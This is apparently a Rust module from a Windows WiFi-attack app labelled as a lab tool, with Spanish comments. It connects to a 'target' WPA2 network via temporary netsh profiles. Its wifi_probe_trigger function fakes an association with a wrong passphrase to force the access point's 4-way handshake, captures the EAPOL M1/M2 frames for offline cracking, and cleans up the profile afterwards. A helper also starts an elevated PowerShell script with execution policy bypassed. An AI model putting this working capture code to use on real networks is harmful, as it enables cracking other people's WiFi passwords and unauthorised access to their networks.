// Conexión a la red atacada — el objetivo final (lab).
// Windows no acepta SSID+clave por CLI directa: se genera un perfil XML
// temporal, se importa con `netsh wlan add profile` y se conecta con
// `netsh wlan connect`. 100% nativo, sin inyección ni monitor mode.
use serde::Serialize;
use tauri::{command, AppHandle};
use tauri_plugin_shell::ShellExt;
use crate::commands::CmdResponse;

/// netsh identifica la interfaz por su nombre corto ("Wi-Fi 5"), no por la
/// descripción completa que devuelve detect_adapters
/// ("Wi-Fi 5 (802.11n USB Wireless LAN Card)"). Medido 2026-11-23.
fn iface_short_name(name: &str) -> String {
    name.split(" (").next().unwrap_or(name).trim().to_string()
}

fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

/// Perfil WLAN para WPA2-PSK/AES (el caso general; WEP/abierta fuera de alcance).
pub fn wlan_profile_xml(ssid: &str, password: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n\
         \x20   <name>{ssid}</name>\n\
         \x20   <SSIDConfig>\n\
         \x20       <SSID>\n\
         \x20           <name>{ssid}</name>\n\
         \x20       </SSID>\n\
         \x20   </SSIDConfig>\n\
         \x20   <connectionType>ESS</connectionType>\n\
         \x20   <connectionMode>auto</connectionMode>\n\
         \x20   <MSM>\n\
         \x20       <security>\n\
         \x20           <authEncryption>\n\
         \x20               <authentication>WPA2PSK</authentication>\n\
         \x20               <encryption>AES</encryption>\n\
         \x20               <useOneX>false</useOneX>\n\
         \x20           </authEncryption>\n\
         \x20           <sharedKey>\n\
         \x20               <keyType>passPhrase</keyType>\n\
         \x20               <protected>false</protected>\n\
         \x20               <keyMaterial>{pass}</keyMaterial>\n\
         \x20           </sharedKey>\n\
         \x20       </security>\n\
         \x20   </MSM>\n\
         </WLANProfile>\n",
        ssid = xml_escape(ssid),
        pass = xml_escape(password),
    )
}

async fn netsh(app: &AppHandle, args: &[&str]) -> Result<(bool, String), String> {
    let shell = app.shell();
    let out = tokio::time::timeout(std::time::Duration::from_secs(20), shell.command("netsh").args(args).output())
        .await
        .map_err(|_| "Timeout: netsh tardó más de 20s.".to_string())?
        .map_err(|e| e.to_string())?;
    Ok((out.status.success(), String::from_utf8_lossy(&out.stdout).into_owned()))
}

/// Comando: conecta a un SSID con clave (perfil temporal, se deja instalado).
#[command]
pub async fn wifi_connect(app: AppHandle, ssid: String, password: String, iface_name: Option<String>) -> CmdResponse {
    if ssid.trim().is_empty() || password.is_empty() {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: "SSID y clave requeridos".into(), exit_code: None,
        };
    }
    // La clave viaja en fichero temporal, nunca en argv.
    let xml_path = std::env::temp_dir().join(format!("uifipill_wlan_{}.xml", std::process::id()));
    if std::fs::write(&xml_path, wlan_profile_xml(ssid.trim(), &password)).is_err() {
        return CmdResponse {
            success: false, output: String::new(),
            stderr: "No se pudo escribir el perfil temporal".into(), exit_code: None,
        };
    }
    let xml = xml_path.display().to_string();
    let (ok_add, out_add) = match netsh(&app, &["wlan", "add", "profile", &format!("filename=\"{}\"", xml), "user=current"]).await {
        Ok(r) => r,
        Err(e) => {
            let _ = std::fs::remove_file(&xml_path);
            return CmdResponse { success: false, output: String::new(), stderr: e, exit_code: None };
        }
    };
    let _ = std::fs::remove_file(&xml_path);
    if !ok_add {
        return CmdResponse {
            success: false,
            output: out_add.clone(),
            stderr: format!("netsh add profile falló:\n{}", out_add),
            exit_code: None,
        };
    }
    // Conectar por nombre de perfil (= SSID).
    let profile = ssid.trim();
    let mut cargs: Vec<String> = vec!["wlan".into(), "connect".into(), format!("name=\"{profile}\"")];
    if let Some(i) = iface_name {
        let i = i.trim();
        if !i.is_empty() { cargs.push(format!("interface=\"{i}\"")); }
    }
    let refs: Vec<&str> = cargs.iter().map(|s| s.as_str()).collect();
    let (ok_con, out_con) = match netsh(&app, &refs).await {
        Ok(r) => r,
        Err(e) => return CmdResponse { success: false, output: out_add, stderr: e, exit_code: None },
    };
    // Verificar estado real de la interfaz.
    let connected = match netsh(&app, &["wlan", "show", "interfaces"]).await {
        Ok((_, info)) => {
            let low = info.to_lowercase();
            low.contains(&profile.to_lowercase()) && (low.contains("conectado") || low.contains("connected"))
        }
        Err(_) => false,
    };
    let ok = ok_con && connected;
    CmdResponse {
        success: ok,
        output: format!(
            "{}\n---\n{}\n---\nEstado: {}",
            out_add.trim(),
            out_con.trim(),
            if ok { format!("CONECTADO a {}", profile) } else { "NO verificado: revisa interfaces".to_string() }
        ),
        stderr: String::new(),
        exit_code: Some(if ok { 0 } else { 1 }),
    }
}

// ── E0-24 fase A: auto-gatillo M1/M2 con la ÚNICA radio WiFi (RT73) ─────────
#[derive(Debug, Clone, Serialize)]
pub struct ProbeResult {
    pub success: bool,
    pub output_file: String,
    pub eapol: bool,
    pub packets: u64,
    pub message: String,
}

/// Intenta asociarse con una clave falsa para provocar el 4-way handshake de un
/// AP SIN clientes, capturando EAPOL en la propia interfaz managed (DLT 1).
/// El perfil es temporal (nombre único) y se borra siempre al terminar.
#[command]
pub async fn wifi_probe_trigger(
    app: AppHandle,
    ssid: String,
    bssid: String,
    channel: Option<u8>,
    duration_secs: Option<u64>,
    iface_name: Option<String>,
) -> ProbeResult {
    let fail = |m: String| ProbeResult { success: false, output_file: String::new(), eapol: false, packets: 0, message: m };
    let ssid = ssid.trim().to_string();
    if ssid.is_empty() { return fail("SSID requerido".into()); }
    let _ = channel; // el canal lo elige el AP; el monitor ya no se usa aquí

    let rep = crate::wifi_adapter::detect_adapters().await;
    // Con DOS radios (RT73 en monitor + RT3070 cliente) hay que separar los
    // papeles: la captura va en el monitor; la asociación, en el cliente.
    // Medido 2026-11-23: `netsh wlan connect name=X` sin `interface=` falla
    // con "Faltan uno o varios parámetros" cuando hay >=2 interfaces.
    let capture_guid = rep.adapters.iter().find(|a| a.monitor_active && !a.guid.is_empty())
        .or_else(|| rep.adapters.iter().find(|a| !a.guid.is_empty()))
        .map(|a| a.guid.clone());
    let guid = match capture_guid { Some(g) => g, None => return fail("sin adaptador WiFi para capturar".into()) };
    let client_name = iface_name.map(|s| s.trim().to_string()).filter(|s| !s.is_empty())
        .or_else(|| rep.adapters.iter().find(|a| !a.monitor_active && !a.guid.is_empty() && !a.name.trim().is_empty())
            .map(|a| a.name.trim().to_string()))
        .or_else(|| if rep.adapters.len() == 1 && !rep.adapters[0].name.trim().is_empty() {
            Some(rep.adapters[0].name.trim().to_string())
        } else { None });
    let client_name = match client_name {
        Some(n) => iface_short_name(&n),
        None => return fail("Hay varias interfaces y no se cuál asociar: cierra el modo monitor del cliente o indícalo con ifaceName (p. ej. 'Wi-Fi 5').".into()),
    };

    let seed = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u64 + d.as_secs()).unwrap_or(12345);
    let profile = format!("uifipill_probe_{seed:x}");
    let wrong_pass = format!("WrongPass{:08x}", seed & 0xffff_ffff);
    let xml = format!(
        "<?xml version=\"1.0\"?>\n\
         <WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n\
         \x20   <name>{p}</name>\n\
         \x20   <SSIDConfig><SSID><name>{s}</name></SSID></SSIDConfig>\n\
         \x20   <connectionType>ESS</connectionType><connectionMode>manual</connectionMode>\n\
         \x20   <MSM><security><authEncryption>\n\
         \x20       <authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX>\n\
         \x20   </authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected>\n\
         \x20       <keyMaterial>{k}</keyMaterial></sharedKey></security></MSM>\n\
         </WLANProfile>\n",
        p = xml_escape(&profile), s = xml_escape(&ssid), k = xml_escape(&wrong_pass)
    );
    let xml_path = std::env::temp_dir().join(format!("{profile}.xml"));
    if std::fs::write(&xml_path, &xml).is_err() { return fail("No se pudo escribir el perfil temporal".into()); }
    let xml_s = xml_path.display().to_string();
    let (ok_add, out_add) = match netsh(&app, &["wlan", "add", "profile", &format!("filename=\"{xml_s}\""), "user=current"]).await {
        Ok(r) => r,
        Err(e) => { let _ = std::fs::remove_file(&xml_path); return fail(e); }
    };
    let _ = std::fs::remove_file(&xml_path);
    if !ok_add { return fail(format!("netsh add profile falló: {}", out_add.trim())); }

    // Arrancar la captura ANTES de conectar para no perder M1/M2.
    let dur = duration_secs.unwrap_or(15).clamp(5, 60);
    // spawnear: si solo creamos el future, el adaptador Npcap NO se abre hasta
    // que se hace await, y para entonces el EAPOL de la asociación ya pasó.
    // NPF_ (DLT 1) no entrega tramas en este driver; NPF_WIFI_ sí, incluso en
    // managed (medido: 442 paquetes durante el intento de asociación).
    // Captura CONTINUA, no capture_until_eapol: medido 2026-11-23 que parar en
    // el primer frame EAPOL deja solo M2 y el conversor no puede construir el
    // .22000 (necesita M1+M2). Los 13 EAPOL del experimento de dos radios se
    // lograron con native_capture sostenido.
    let cap_handle = tokio::spawn(crate::capture::native_capture(guid.clone(), Some(dur), None));
    // Ojo: el plugin shell de Tauri pasa los argumentos directamente a
    // CreateProcess (sin cmd.exe), así que las comillas LITERALES que pondría
    // un `netsh ... name="X"` en PowerShell aquí son parte del valor y netsh
    // las rechaza ("Faltan uno o varios parámetros"). Sin comillas, un solo
    // argv `interface=Wi-Fi 5` es exactamente lo que netsh recibe en PowerShell.
    let connect_args = [ "wlan".to_string(), "connect".to_string(),
        format!("name={profile}"), format!("interface={client_name}") ];
    let connect_refs: Vec<&str> = connect_args.iter().map(|s| s.as_str()).collect();
    let (ok_con, out_con) = match netsh(&app, &connect_refs).await {
        Ok(r) => r,
        Err(e) => return fail(e),
    };
    let cap = cap_handle.await.unwrap_or_else(|e| crate::capture::NativeCaptureResult {
        success: false, output_file: String::new(), packets: 0, datalink: -1,
        datalink_name: String::new(), message: format!("join error: {e}"),
    });
    let eapol = std::fs::read(&cap.output_file)
        .map(|b| b.windows(2).any(|w| w == [0x88u8, 0x8eu8]))
        .unwrap_or(false);
    let _ = netsh(&app, &["wlan", "delete", "profile", &format!("name={profile}")]).await;
    let _ = netsh(&app, &["wlan", "disconnect"]).await;

    ProbeResult {
        success: cap.success && !cap.output_file.is_empty(),
        output_file: cap.output_file,
        eapol,
        packets: cap.packets,
        message: format!("conectar={ok_con} (iface {client_name}, objetivo {bssid}) · {}\n{} (EAPOL={eapol})", out_con.trim(), cap.message),
    }
}

/// Comando: desconecta la interfaz Wi-Fi.
#[command]
pub async fn wifi_disconnect(app: AppHandle) -> CmdResponse {
    match netsh(&app, &["wlan", "disconnect"]).await {
        Ok((ok, out)) => CmdResponse { success: ok, output: out, stderr: String::new(), exit_code: Some(ok as i32) },
        Err(e) => CmdResponse { success: false, output: String::new(), stderr: e, exit_code: None },
    }
}

/// E-26: lanzar el reset elevado (disable/enable) del adaptador WiFi cuando
/// restore_managed por OID no despierta el stack de scan. Muestra UAC.
#[command]
pub async fn wifi_reset_admin(iface_name: Option<String>) -> CmdResponse {
    tauri::async_runtime::spawn_blocking(move || {
        let mut dirs: Vec<std::path::PathBuf> = Vec::new();
        if let Ok(exe) = std::env::current_exe() {
            if let Some(p) = exe.parent() {
                dirs.push(p.join("scripts"));
                dirs.push(p.join("_up_").join("scripts"));
                dirs.push(p.join("resources"));
            }
        }
        if let Ok(cwd) = std::env::current_dir() { dirs.push(cwd.join("scripts")); }
        let script = match dirs.into_iter().find(|d| d.join("reset_wifi.ps1").exists()) {
            Some(d) => d.join("reset_wifi.ps1"),
            None => return CmdResponse { success: false, output: String::new(),
                stderr: "No se encontró scripts/reset_wifi.ps1 (debe ir en el instalador).".into(), exit_code: None },
        };
        let name = iface_name.unwrap_or_default().replace('\'', "''");
        let path = script.to_string_lossy().replace('\'', "''");
        // Sin -Wait y con spawn(): si el usuario tarda en aceptar el UAC, la
        // app NO se queda bloqueada (medido: 20 min colgada con .output()).
        let cmd = format!(
            "Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File','{path}','-AdapterName','{name}') -Verb RunAs"
        );
        match crate::process_util::hidden_command("powershell.exe")
            .args(["-NoProfile", "-Command", &cmd])
            .spawn()
        {
            Ok(_) => CmdResponse {
                success: true,
                output: "Reparación elevada lanzada. Acepta el UAC; la app reescanea en unos segundos.".into(),
                stderr: String::new(), exit_code: Some(0),
            },
            Err(e) => CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None },
        }
    }).await.unwrap_or_else(|_| CmdResponse { success: false, output: String::new(), stderr: "join error".into(), exit_code: None })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn iface_short_name_strips_description() {
        assert_eq!(iface_short_name("Wi-Fi 5 (802.11n USB Wireless LAN Card)"), "Wi-Fi 5");
        assert_eq!(iface_short_name("  Wi-Fi 3 (RT73 #2) "), "Wi-Fi 3");
        assert_eq!(iface_short_name("Conexión de red inalámbrica"), "Conexión de red inalámbrica");
    }

    #[test]
    fn xml_escapes_and_shapes() {
        let x = wlan_profile_xml("Mi&Red<1>", "p\"a's<s>");
        assert!(x.contains("<name>Mi&amp;Red&lt;1&gt;</name>"));
        assert!(x.contains("<keyMaterial>p&quot;a&apos;s&lt;s&gt;</keyMaterial>"));
        assert!(x.contains("<authentication>WPA2PSK</authentication>"));
        assert!(!x.contains("Mi&Red"));
    }
}
